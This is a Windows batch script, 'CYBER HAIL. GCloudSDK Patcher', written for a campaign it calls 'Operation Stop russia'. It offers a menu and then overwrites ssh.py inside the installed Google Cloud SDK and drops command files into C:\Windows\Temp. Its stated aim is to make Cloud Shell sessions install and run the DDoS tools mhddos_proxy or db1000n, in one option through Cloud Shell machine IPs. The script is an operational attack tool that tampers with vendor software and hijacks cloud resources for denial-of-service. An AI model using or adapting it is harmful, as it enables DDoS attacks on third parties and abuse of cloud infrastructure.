@Echo off
mode con:cols=110 lines=19
title CYBER HAIL. GCloudSDK Patcher
Echo.
:m2
Echo.
Echo.
Echo  		Patcher for GoogleCloudSDK 			 (Operation "Stop russia")
Echo.
Echo.
Echo 	enter "1"  to perform the patch to start sessions with installation and running mhddos_proxy
Echo.
Echo 	enter "2"  to perform the patch to start sessions with installation and running db1000n
Echo.
Echo 	enter "3"  to perform the patch to start sessions with installation and running mhddos_proxy
Echo			   using IP CloudShell machines (Test!)
Echo.
Echo.
Echo 	enter "0" - to restore original Google Cloud SDK files (cancel patch)
Echo.
Echo.
Echo.
Set /p choice=" Your choice: "
if not defined choice goto m2
if "%choice%"=="1" Copy /Y Bin\ssh.py "C:\Program Files (x86)\Google\Cloud SDK\google-cloud-sdk\lib\googlecloudsdk\command_lib\util\ssh" && Copy /Y Bin\1\Command(Operation-Stop_russia).txt C:\Windows\Temp && echo Patch GCloudSDK for mhddos_proxy installed && pause && exit
if "%choice%"=="2" Copy /Y Bin\ssh.py "C:\Program Files (x86)\Google\Cloud SDK\google-cloud-sdk\lib\googlecloudsdk\command_lib\util\ssh" && Copy /Y Bin\2\Command(Operation-Stop_russia).txt C:\Windows\Temp && echo Patch GCloudSDK for db1000n installed && pause && exit
if "%choice%"=="3" Copy /Y Bin\ssh.py "C:\Program Files (x86)\Google\Cloud SDK\google-cloud-sdk\lib\googlecloudsdk\command_lib\util\ssh" && Copy /Y Bin\3\Command(Operation-Stop_russia).txt C:\Windows\Temp && echo Test! Patch GCloudSDK for mhddos_proxy (--vpn) installed && pause && exit
if "%choice%"=="0" Copy /Y Bin\0\ssh.py "C:\Program Files (x86)\Google\Cloud SDK\google-cloud-sdk\lib\googlecloudsdk\command_lib\util\ssh" && Del /q C:\Windows\Temp\Command(Operation-Stop_russia).txt && echo Original Google Cloud SDK files restored && goto m2
Echo.
Echo  ! Incorrect input
goto m2

